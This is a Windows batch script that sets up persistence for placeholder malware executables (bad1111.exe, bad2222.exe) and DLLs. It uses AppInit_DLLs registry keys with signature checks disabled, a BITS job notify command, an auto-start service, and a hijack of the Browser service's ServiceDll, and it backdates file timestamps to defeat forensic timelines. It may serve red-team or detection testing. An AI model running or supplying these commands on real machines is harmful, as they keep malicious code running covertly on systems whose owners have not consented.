@echo off

rem mkdir c:\temp
rem copy bad1111.exe c:\temp
rem copy bad2222.exe c:\temp



2>NUL CALL :CASE_%OPT%
IF ERRORLEVEL 1 CALL :DEFAULT

EXIT /B

:CASE_appinit
REM UDP Psersistence AppInit keys
REM 64-bit
touch -t 201308220431 -- c:\temp\updll64.dll
move /y updll64.dll c:\windows\system32
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /d "updll64.dll" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v RequireSignedAppInit_DLLs /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
REM 32-bit
touch -t 201308220431 -- c:\temp\updll32.dll
move /y updll32.dll c:\windows\syswow64
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /d "updll32.dll" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v RequireSignedAppInit_DLLs /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f

:CASE_bitsadmin
SET SERVICENAME=blark
REM bitsadmin persistance
bitsadmin /rawreturn /reset
bitsadmin /rawreturn /create %SERVICENAME%
bitsadmin /rawreturn /addfile %SERVICENAME% c:\windows\system32\user32.dll c:\users\public\documents\user32.gif
bitsadmin /rawreturn /setnotifycmdline TEST c:\temp\bad1111.exe NULL
bitsadmin /rawreturn /setpriority %SERVICENAME% high
bitsadmin /rawreturn /resume %SERVICENAME%

:CASE_service
REM service persistence
SET SERVICENAME=blark
SET SERVICEDESC=blark
sc delete %SERVICENAME%
sc create %SERVICENAME% binpath= c:\temp\bad2222.exe error= ignore start= auto DisplayName= blark
sc description %SERVICENAME% %SERVICEDESC%
sc start %SERVICENAME%

:CASE_servicedll
touch -t 201308220431 -- c:\temp\updll64.dll
move /y updll64.dll c:\windows\system32
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Browser\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "c:\windows\system32\updll64.dll" /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Browser" /v Start /t REG_DWORD /d 2 /f
reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Browser\TriggerInfo" /f
reg delete "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Browser" /v DependOnService /f
sc config Browser start= auto
sc start Browser
